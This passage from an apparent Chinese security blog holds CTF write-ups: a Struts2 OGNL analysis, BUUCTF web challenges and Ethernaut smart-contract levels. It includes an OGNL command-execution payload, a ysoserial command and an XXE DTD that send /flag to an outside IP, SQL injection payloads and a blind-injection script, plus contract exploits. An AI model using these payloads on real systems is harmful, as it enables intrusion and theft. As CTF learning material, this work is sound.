进入到重载函数determineActionURL，执行到最后发现我们payload前半段已经被被执行，actionMapper中的allowDynamicMethodCalls属性已经变为true，继续跟入buildUrl方法![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161712049.png)\n6. 步过到buildParametersString，步入该函数，可以看到我们传入的url和参数被传入其中![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161714673.png)\n7. 进入到重载方法中，执行直到166行buildParameterSubstring函数，可以看到我们的payload已经被传入其中![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161717072.png)\n8. 继续跟入translateAndEncode函数，跟入translateVariable函数，可以发现valueStack出现了![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161718405.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161719376.png)\n9. 继续跟入就是translateVariables函数了，OGNL表达式在这里被执行![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161720361.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\npayload：\n\n```\n?a=%24%7B%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D \n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"BUUCTF记录3","url":"/posts/560a0a51.html","content":"\nBUU第三份\n\n<!--more -->\n\n## [极客大挑战 2020]Roamphp2-Myblog\n\n明显的文件读取，login中能看到登录密码生成逻辑，完全随机，没法直接拿到\n\n```php\n<?php\n$secret_seed = mt_rand();\nmt_srand($secret_seed);\n$_SESSION['password'] = mt_rand();\nprint($_SESSION['password']);\n?>\n```\n\n看登录逻辑\n\n```php\n<?php\nerror_reporting(0);\nsession_start();\n$logined = false;\nif (isset($_POST['username']) and isset($_POST['password'])){\n    if ($_POST['username'] === \"Longlone\" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself\n        $logined = true;\n        $_SESSION['status'] = $logined;\n    }\n}\nif ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){\n    echo \"<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>\";\n    die();\n}\n?>\n  <?php\n  if(isset($_FILES['Files']) and $_SESSION['status'] === true){\n    $tmp_file = $_FILES['Files']['name'];\n    $tmp_path = $_FILES['Files']['tmp_name'];\n    if(($extension = pathinfo($tmp_file)['extension']) != \"\"){\n      $allows = array('gif','jpeg','jpg','png');\n      if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){\n        $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;\n        move_uploaded_file($tmp_path,\"assets/img/upload/\".$upload_name);\n        echo \"<script>alert('Update image -> assets/img/upload/${upload_name}') </script>\";\n      } else {\n        echo \"<script>alert('Update illegal! Only allows like \\'gif\\', \\'jpeg\\', \\'jpg\\', \\'png\\' ') </script>\";\n      }\n    }\n  }\n?>\n```\n\n可以看到密码验证中有一个弱比较，传入password为空直接绕过，然后就是文件上传，逻辑就是只能传图片，但是并没有限制文件内容，那phar或者zip吧内容打包都可以（因为触发还需要index中的include xxx.php，所以文件只能以php结尾），记得拦截包修改一下username和password参数，不然直接退出了\n\n```\nflag{fa7bcb65-99a0-4643-93c2-93cacaaf442c}\n```\n\n## [网鼎杯 2020 朱雀组]Think Java\n\n嘿嘿做的第一道Java题，记录一下Java应该怎么入手，首先目录扫描，扫出了`swagger-ui.html`，可以看到这个web页面使用的所有API![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png)\n\n\n\n\n\n\n\n\n\n看代码是`/common/test/sqlDict`这一路径的调用，其中dbName是我们传参内容，跟进其中的SqlDict.getTableData，查看getConnection方法，其中本质是通过jdbc接口进行数据库连接，而jdbc在解析数据库时类似于对URL的解析\n\n> JDBC 的 URL 也类似 http 请求中的 URL，也可以使用锚点 # 或者 ? 如：jdbc:mysql://mysqldbserver:3306/myapp#' union select 2#\n>\n\n也就是#后面的内容会被忽略，但是这部分信息依然会被传递到dbName参数中进行接下来的查询\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837304.png)\n\n那我们就可以直接构造出sql注入的语句\n\n```\ndbName=myapp#' union select group_concat(name,0x3a,pwd)from user#\n构造出的语句\nSelect TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = 'myapp#' union select group_concat(name,0x3a,pwd)from user#后面的不重要\n```\n\n拿到用户名和密码`admin:admin@Rrrr_ctf_asde`\n\n登录成功拿到token，发现是Java序列化后内容\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png)\n\n并且将内容提交到currentAPI中时，也会返回用户信息，yso构造序列化攻击即可\n\n```shell\n/Users/jlan/Library/Java/JavaVirtualMachines/azul-1.8.0_332/Contents/Home/bin/java -jar /Users/jlan/Documents/Tools/ysoserial-all.jar ROME \"curl http://182.61.46.138:1000 -d @/flag\" |base64\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png)\n\n## [GKCTF 2021]babycat\n\n快乐java题，靶机启动真的好慢，上来就是一个nt登录界面，登录不行，注册未开放![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png)\n\n但是点击注册查看源代码发现是注册逻辑被注释，按照注释的逻辑构造payload注册，成功注册并登录![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131745556.png)\n\n进入主页发电文件上传需要admin权限，并且在download存在文件泄露，先看web.xml内容，根据内容将class文件依次下载，下面我们主要查看uploadServlet和registerServlet\n\n```xml-dtd\n<!DOCTYPE web-app PUBLIC\n \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n \"http://java.sun.com/dtd/web-app_2_3.dtd\" >\n\n<web-app>\n  <servlet>\n    <servlet-name>register</servlet-name>\n    <servlet-class>com.web.servlet.registerServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>login</servlet-name>\n    <servlet-class>com.web.servlet.loginServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>home</servlet-name>\n    <servlet-class>com.web.servlet.homeServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>upload</servlet-name>\n    <servlet-class>com.web.servlet.uploadServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>download</servlet-name>\n    <servlet-class>com.web.servlet.downloadServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>logout</servlet-name>\n    <servlet-class>com.web.servlet.logoutServlet</servlet-class>\n  </servlet>\n  <servlet-mapping>\n    <servlet-name>logout</servlet-name>\n    <url-pattern>/logout</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>download</servlet-name>\n    <url-pattern>/home/download</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>register</servlet-name>\n    <url-pattern>/register</url-pattern>\n  </servlet-mapping>\n  <display-name>java</display-name>\n  <servlet-mapping>\n    <servlet-name>login</servlet-name>\n    <url-pattern>/login</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>home</servlet-name>\n    <url-pattern>/home</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>upload</servlet-name>\n    <url-pattern>/home/upload</url-pattern>\n  </servlet-mapping>\n\n  <filter>\n    <filter-name>loginFilter</filter-name>\n    <filter-class>com.web.filter.LoginFilter</filter-class>\n  </filter>\n  <filter-mapping>\n    <filter-name>loginFilter</filter-name>\n    <url-pattern>/home/*</url-pattern>\n  </filter-mapping>\n  <display-name>java</display-name>\n\n  <welcome-file-list>\n    <welcome-file>/WEB-INF/index.jsp</welcome-file>\n  </welcome-file-list>\n</web-app>\n\n```\n\n那我们该如何成为admin呢，直接看注册类中的关键代码\n\n```java\nif (!StringUtils.isNullOrEmpty(role)) {\n    var = var.replace(role, \"\\\"role\\\":\\\"guest\\\"\");\n    person = (Person)gson.fromJson(var, Person.class);\n} else {\n    person = (Person)gson.fromJson(var, Person.class);\n    person.setRole(\"guest\");\n}\n```\n\n此处对我们传入的data注册信息进行了处理，将role的json内容换成了guest，也就是说我们直接更改data中的role属性是行不通的，这里我们可以使用unicode字符绕过，并且在属性中多添加一层内容使其中包含了role属性来确保我们能够进入第一个判断，构造出的payload如下\n\n```\n\n```\n\n注册成功并且成功进入文件上传界面![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131804530.png) \n\n传一个jsp马到static目录下连接即可\n\n但是似乎buu的这个版本是修复后的，对文件内容进行了过滤，没法传🐎，我有什么办法（\n\n## [HarekazeCTF2019]Sqlite Voting\n\n源码全是过滤\n\n```php\n<?php\nerror_reporting(0);\n\nif (isset($_GET['source'])) {\n  show_source(__FILE__);\n  exit();\n}\n\nfunction is_valid($str) {\n  $banword = [\n    // dangerous chars\n    // \" % ' * + / < = > \\ _ ` ~ -\n    \"[\\\"%'*+\\\\/<=>\\\\\\\\_`~-]\",\n    // whitespace chars\n    '\\s',\n    // dangerous functions\n    'blob', 'load_extension', 'char', 'unicode',\n    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',\n    'in', 'limit', 'order', 'union', 'join'\n  ];\n  $regexp = '/' . implode('|', $banword) . '/i';\n  if (preg_match($regexp, $str)) {\n    return false;\n  }\n  return true;\n}\n\nheader(\"Content-Type: text/json; charset=utf-8\");\n\n// check user input\nif (!isset($_POST['id']) || empty($_POST['id'])) {\n  die(json_encode(['error' => 'You must specify vote id']));\n}\n$id = $_POST['id'];\nif (!is_valid($id)) {\n  die(json_encode(['error' => 'Vote id contains dangerous chars']));\n}\n\n// update database\n$pdo = new PDO('sqlite:../db/vote.db');\n$res = $pdo->query(\"UPDATE vote SET count = count + 1 WHERE id = ${id}\");\nif ($res === false) {\n  die(json_encode(['error' => 'An error occurred while updating database']));\n}\n\n// succeeded!\necho json_encode([\n  'message' => 'Thank you for your vote! The result will be published after the CTF finished.'\n]);\n```\n\n没见过的sqlite，题解\n\n> 解题思路是利用sqlite逻辑报错进行盲注,abs函数存在整型溢出\n>\n> 利用ifnull,nullif注入flag长度\n\n```\nabs(ifnull(nullif(length((SELECT(flag)from(flag))),{i}),0x8000000000000000))\n```\n\n这句语句的意思是，如果前面的length的值等于我们传入i的值，那么nullif就会返回null，如果返回了null那么ifnull就会返回后面的值，此时abs溢出报错，可以拿到flag长度\n\n```python\nimport requests\nurl = \"http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php\"\nfor i in range(1,100):\n    data = {\n        'id':f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),{i}),0x8000000000000000))'\n    }\n    rep = requests.post(url,data=data)\n    print(data)\n    if 'An error occurred' in rep.text:\n        print('length: '+str(i))\n        break\n```\n\n然后通过||来拼接字符，通过replace来进行逐位猜测，通过返回的长度来做判断，而对于字母则使用hex来提取\n\n```python\ntable = {}\ntable['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)' # 'zebra' → '7A65627261'\ntable['C'] = 'trim(hex(typeof(.1)),12567)' # 'real' → '7265616C'\ntable['D'] = 'trim(hex(0xffffffffffffffff),123)' # 0xffffffffffffffff = -1 → '2D31'\ntable['E'] = 'trim(hex(0.1),1230)' # 0.1 → 302E31\ntable['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)' # 'dog' → '646F67'\ntable['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table[\"C\"]}||{table[\"F\"]})' # 'koala' → '6B6F616C61'\n```\n\n最终通过[脚本](https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB题解/#Sqlite-Voting)拿到flag\n\n## [网鼎杯 2020 青龙组]filejava\n\n一个上传，上传之后可以下载，看到链接里面有文件名，尝试目录穿越拿web.xml文件![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png)\n\n下载class（`../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class`）进行反编译，得到源码，我们直接看上传的关键部分\n\n```java\nif (filename.startsWith(\"excel-\") && \"xlsx\".equals(fileExtName))\n\ttry {\n\t\tWorkbook wb1 = WorkbookFactory.create(in);\n\t\tSheet sheet = wb1.getSheetAt(0);\n\t\tSystem.out.println(sheet.getFirstRowNum());\n\t} catch (InvalidFormatException e) {\n\t\tSystem.err.println(\"poi-ooxml-3.10 has something wrong\");\n\t\te.printStackTrace();\n\t}  \n```\n\n此处使用`poi-ooxml-3.10`来解析数据，这个版本有漏洞可导致XXE，CVE-2014-3529\n\n那么就直接利用，首先在自己服务器上放一个f.dtd\n\n```xml-dtd\n<!ENTITY % file SYSTEM \"file:///flag\">\n<!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://182.61.46.138?p=%file;'>\">\n```\n\n然后更改xlsx中的[Content_Types].xml文件，添加如下内容\n\n```xml-dtd\n<!DOCTYPE convert [\n<!ENTITY % remote SYSTEM \"http://182.61.46.138/f.dtd\">\n%remote;%int;%send;\n]>\n```\n\n重新压缩上传即可接收flag\n\n\n\n## [HXBCTF 2021]easywill\n\n跟源码，后面再补\n\n## [羊城杯 2020]EasySer\n\n不给源码就是纯纯有病的谜语题，给了源码简单多了，正常序列化使用base64绕过die即可\n\n## [JMCTF 2021]UploadHub\n\n.htaccess\n\n## [红明谷CTF 2021]JavaWeb\n\njava，进去就是让我们login，login页面让我们访问json，但是没权限需要先登录，那就尝试传入登录，登录失败，但是看响应头![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210070120704.png)\n\nsetCookie中的deleteMe可以确认使用的是shiro框架（我也不知道为啥\n\n那么首先使用CVE-2020-11989来进行Apache Shiro权限绕过，加个/;/json来直接访问json\n\n然后使用CVE-2019-14439的反序列化链打进去，用JNDI-Injection-Exploit来生成payload\n\n## [HCTF 2018]Hideandseek\n\n登录，任意输入除admin之外的用户名和密码，然后就让上传zip，第一件事就想到软连接，确实可以![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png)\n\n那读一下源码吧，盲猜是个python，proc读试试，~~事实证明直接莽是没什么卵子用的~~，还是乖乖读了environ，然后/app/main.py读源码\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,session,render_template,redirect, url_for, escape, request,Response\nimport uuid\nimport base64\nimport random\nimport flag\nfrom werkzeug.utils import secure_filename\nimport os\nrandom.seed(uuid.getnode())\napp = Flask(__name__)\napp.config['SECRET_KEY'] = str(random.random()*100)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['zip'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n\n@app.route('/', methods=['GET'])\ndef index():\n    error = request.args.get('error', '')\n    if(error == '1'):\n        session.pop('username', None)\n        return render_template('index.html', forbidden=1)\n\n    if 'username' in session:\n        return render_template('index.html', user=session['username'], flag=flag.flag)\n    else:\n        return render_template('index.html')\n\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username=request.form['username']\n    password=request.form['password']\n    if request.method == 'POST' and username != '' and password != '':\n        if(username == 'admin'):\n            return redirect(url_for('index',error=1))\n        session['username'] = username\n    return redirect(url_for('index'))\n\n\n@app.route('/logout', methods=['GET'])\ndef logout():\n    session.pop('username', None)\n    return redirect(url_for('index'))\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'the_file' not in request.files:\n        return redirect(url_for('index'))\n    file = request.files['the_file']\n    if file.filename == '':\n        return redirect(url_for('index'))\n    if file and allowed_file(file.filename):\n        filename = secure_filename(file.filename)\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a zipfile'\n\n\n    try:\n        extract_path = file_save_path + '_'\n        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)\n        read_obj = os.popen('cat ' + extract_path + '/*')\n        file = read_obj.read()\n        read_obj.close()\n        os.system('rm -rf ' + extract_path)\n    except Exception as e:\n        file = None\n\n    os.remove(file_save_path)\n    if(file != None):\n        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):\n            return redirect(url_for('index', error=1))\n    return Response(file)\n\n\nif __name__ == '__main__':\n    #app.run(debug=True)\n    app.run(host='0.0.0.0', debug=True, port=10008)\n\n```\n\n看代码读一下随机数的种子\n\n```python\nimport uuid\nimport random\n\nmac = \"0e:48:30:60:37:27\"\ntemp = mac.split(':')\ntemp = [int(i,16) for i in temp]\ntemp = [bin(i).replace('0b','').zfill(8) for i in temp]\ntemp = ''.join(temp)\nmac = int(temp,2)\nrandom.seed(mac)\nrandStr = str(random.random()*100)\nprint(randStr)#69.83331307187989\n```\n\n剩下就是伪造拿flag\n"},{"title":"Ethernaut记录","url":"/posts/b1d79a49.html","content":"\n## Fallback\n\n首先看通关方式\n\n> 仔细看下面的合约代码.\n>\n> 通过这关你需要\n>\n> 1. 获得这个合约的所有权\n> 2. 把他的余额减到0\n>\n>  这可能有帮助\n>\n> - 如何通过与ABI互动发送ether\n> - 如何在ABI之外发送ether\n> - 转换 wei/ether 单位 (参见 `help()` 命令)\n> - Fallback 方法\n\n再看代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\nimport '@openzeppelin/contracts/math/SafeMath.sol';\ncontract Fallback {\n  using SafeMath for uint256;\n  mapping(address => uint) public contributions;\n  address payable public owner;\n  constructor() public {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n  modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n  function contribute() public payable {\n    require(msg.value < 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n  function withdraw() public onlyOwner {\n    owner.transfer(address(this).balance);\n  }\n  receive() external payable {\n    require(msg.value > 0 && contributions[msg.sender] > 0);\n    owner = msg.sender;\n  }\n}\n```\n\n逐步分析，在合约的构造函数中将合约的部署者设置成了函数的owner并且设定了其贡献值为1000eth，如果走contribute函数来获取owner权限的话需要超过1000eth的贡献，而每次的贡献又需要小于0.001eth，这显然是不现实的，所以我们看向receive函数，在这里只要我们向receive函数携带eth，并且我们有贡献值就能拿到owner权限，最后再使用withdraw将合约剩余代币转出即可\n\n- contract.contribute({value:1})\n- contract.sendTransaction({value:1})\n- contract.withdraw()\n\n## FallOut\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallout {\n  \n  using SafeMath for uint256;\n  mapping (address => uint) allocations;\n  address payable public owner;\n  /* constructor */\n  function Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n\n  modifier onlyOwner {\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    }\n\n  function allocate() public payable {\n    allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n  }\n\n  function sendAllocation(address payable allocator) public {\n    require(allocations[allocator] > 0);\n    allocator.transfer(allocations[allocator]);\n  }\n\n  function collectAllocations() public onlyOwner {\n    msg.sender.transfer(address(this).balance);\n  }\n\n  function allocatorBalance(address allocator) public view returns (uint) {\n    return allocations[allocator];\n  }\n}\n```\n\n> 这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?\n>\n> 实际上... 也未必.\n>\n> Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 'Dynamic Pyramid' 改成 'Rubixi' 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:\n>\n> ```\n> contract Rubixi {\n>   address private owner;\n>   function DynamicPyramid() { owner = msg.sender; }\n>   function collectAllFees() { owner.transfer(this.balance) }\n>   ...\n> ```\n>\n> 这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的.\n\n就这没错\n\n## Coin Flip\n\n> 这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。\n>\n> 这可能能帮助到你\n>\n> - 查看上面的帮助页面，“控制台之外” 部分\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract CoinFlip {\n\n  using SafeMath for uint256;\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() public {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n\n    if (lastHash == blockValue) {\n      revert();//回滚\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue.div(FACTOR);\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\n看代码定义的三个数字consecutiveWins，lastHash，FACTOR，分别是我们获胜的次数，最后一次区块的哈希，还有2的255次方\n\n再看后面整个对硬币反转做判断的函数内容，首先是让blockValue值为前一个区块，并且进行判断如果此次猜测和上次猜测的区块相同就回滚整个过程，如果不是就继续下面内容\n\n首先将此次的区块内容存储，并且让coinFilp的值为blockValue/FACTOR，此处由于自动取整，并且FACTOR值为2^255，所以结果非1即0，可以看到整个过程随机结果的产生完全依靠于上一个区块，所以我们只需要先本地执行一遍算法计算出coinFlip的值就能保证我们每次都“猜”到结果，区块大约为10秒一个，所以直接使用手撸复制猜测是不现实，我们可以再写一个合约部署到相同的区块链上来攻击该链\n\n```solidity\npragma solidity ^0.4.18;\ncontract CoinFlip {\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n  function CoinFlip() public {\n    consecutiveWins = 0;\n  }\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(block.blockhash(block.number-1));\n    if (lastHash == blockValue) {\n      revert();\n    }\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue/FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n\ncontract exploit {\n  CoinFlip expFlip;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n  function exploit(address aimAddr) {\n    expFlip = CoinFlip(aimAddr);\n  }\n  function hack() public {\n    uint256 blockValue = uint256(block.blockhash(block.number-1));\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\n    bool guess = coinFlip == 1 ? true : false;\n    expFlip.flip(guess);\n  }\n}\n```\n\n在Remix IDE中通过Metamask部署到题目的区块链上，进行10次hack攻击即可\n\n> 通过solidity产生随机数没有那么容易. 目前没有一个很自然的方法来做到这一点, 而且你在智能合约中做的所有事情都是公开可见的, 包括本地变量和被标记为私有的状态变量. 矿工可以控制 blockhashes, 时间戳, 或是是否包括某个交易, 这可以让他们根据他们目的来左右这些事情.\n>\n> 想要获得密码学上的随机数,你可以使用 [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.\n>\n> 一些其它的选项包括使用比特币block headers (通过验证 [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), 或是 [Oraclize](http://www.oraclize.it/)).\n\n## Telephone\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\ncontract Telephone {\n  address public owner;\n  constructor() public {\n    owner = msg.sender;\n  }\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n```\n\n直接看`tx.origin`和`msg.sender`的区别\n\n**msg.sender:** 指直接调用智能合约功能的帐户或智能合约的地址\n**tx.origin:** 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin\n\n![](https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg)\n\n我们开一个新合约直接传入我们自己的address通过新合约调用Telephone合约即可\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\ncontract Telephone {\n  address public owner;\n  constructor() public {\n    owner = msg.sender;\n  }\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\ncontract hh{\n    address ow=0xeeD53DF0B7E5CF4272a2E92c4E39B1405910d8C7;\n    Telephone exp;\n    constructor(address name){\n        exp=Telephone(name);\n    }\n    function hack(){\n        exp.changeOwner(ow);\n    }\n}\n```\n\n> 这个例子比较简单, 混淆 `tx.origin` 和 `msg.sender` 会导致 phishing-style 攻击, 比如[this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).\n>\n> 下面描述了一个可能的攻击.\n>\n> 1. 使用 `tx.origin` 来决定转移谁的token, 比如.\n>\n> ```\n> function transfer(address _to, uint _value) {\n>   tokens[tx.origin] -= _value;\n>   tokens[_to] += _value;\n> }\n> ```\n>\n> 2. 攻击者通过调用合约的 transfer 函数是受害者向恶意合约转移资产, 比如\n>\n> ```\n> function () payable {\n>   token.transfer(attackerAddress, 10000);\n> }\n> ```\n>\n> 3. 在这个情况下, `tx.origin` 是受害者的地址 ( `msg.sender` 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.\n\n## Token\n\n> 这一关的目标是攻破下面这个基础 token 合约\n>\n> 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好\n>\n>  这可能有帮助:\n>\n> - 什么是 odometer?\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Token {\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public {\n    balances[msg.sender] = totalSupply = _initialSupply;\n  }\n\n  function transfer(address _to, uint _value) public returns (bool) {\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  }\n\n  function balanceOf(address _owner) public view returns (uint balance) {\n    return balances[_owner];\n  }\n}\n```\n\n看代码，balances映射的相当是我们的token个数，初始为20个，再看transfer函数，要求我们的token数减去交易数要大于等于0，但是问题是token数和交易数都是uint类型，恒大于等于0（因为运算结果也是uint类型），所以require根本不需要绕过，如果我们将`_value`值设定为21，就会出现溢出，导致我们的balance极大，也就完成了任务\n\n```\ncontract.transfer(instance,21)\n```\n\n> Overflow 在 solidity 中非常常见, 你必须小心检查, 比如下面这样:\n>\n> ```\n> if(a + c > a) {\n>   a = a + c;\n> }\n> ```\n>\n> 另一个简单的方法是使用 OpenZeppelin 的 SafeMath 库, 它会自动检查所有数学运算的溢出, 可以像这样使用:\n>\n> ```\n> a = a.add(c);\n> ```\n>\n> 如果有溢出, 代码会自动恢复.\n\n## Delegation\n\n> 这一关的目标是申明你对你创建实例的所有权.\n>\n>  这可能有帮助\n>\n> - 仔细看solidity文档关于 `delegatecall` 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.\n> - Fallback 方法\n> - 方法 ID\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Delegate {\n\n  address public owner;\n\n  constructor(address _owner) public {\n    owner = _owner;\n  }\n\n  function pwn() public {\n    owner = msg.sender;\n  }\n}\n\ncontract Delegation {\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) public {\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  }\n\n  fallback() external {\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) {\n      this;\n    }\n  }\n}\n```\n\n很明显需要通过调用pwn函数来将owner变成我们自己，但是部署的合约是`Delegation`，我们该如何调用另一个合约中的函数呢，很简单，使用solidity中自带的call方法即可\n\n在solidity中有三种call方法可用：\n\n- **call**\n\n  ```\n  <address>.call(bytes memory) returns (bool, bytes memory)\n  ```\n\n  使用给定的payload发出一个低级(low-level)的`CALL`命令，返回执行是否成功和数据，转发所有可用gas，可调整。\n\n- **delegatecall**\n\n  ```\n  <address>.delegatecall(bytes memory) returns (bool, bytes memory)\n  ```\n\n  使用给定payload发出一个低级的`DELEGATECALL`指令，返回执行是否成功和数据，转发所有可用gas，可调整。\n\n- **staticcall**\n\n  ```\n  <address>.staticcall(bytes memory) returns (bool, bytes memory)\n  ```\n\n  使用给定payload发出一个低级的`STATICCALL`指令，返回执行是否成功和数据，转发所有可用gas，可调整。\n\n- ~~这官方文档纯纯废话，说了跟没说一样~~\n\n乍一看似乎内容都差不多，那我们自己调用这些命令来测试一下吧\n\n```solidity\npragma solidity 